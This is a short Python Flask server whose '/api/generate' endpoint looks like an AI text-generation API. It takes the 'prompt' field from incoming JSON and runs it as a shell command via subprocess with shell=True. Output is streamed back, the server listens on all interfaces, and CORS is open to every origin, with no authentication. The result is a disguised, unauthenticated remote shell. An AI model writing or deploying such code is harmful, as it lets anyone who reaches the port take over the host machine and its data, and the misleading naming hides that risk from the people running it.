from flask import Flask, request, Response
from flask_cors import CORS
import subprocess
import os

app = Flask(__name__)
CORS(app)

@app.route('/api/generate', methods=['POST'])
def generate():
    cmd = request.json.get('prompt', '').strip()
    def stream():
        yield "data: [SYSTEM]: Kernel active. Processing...\n"
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            for line in process.stdout:
                yield f"data: {line.decode('utf-8', 'ignore')}"
            yield "data: \n[SUCCESS]: Task Completed.\n"
        except Exception as e:
            yield f"data: \n[ERROR]: {str(e)}\n"
    return Response(stream(), mimetype='text/event-stream')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
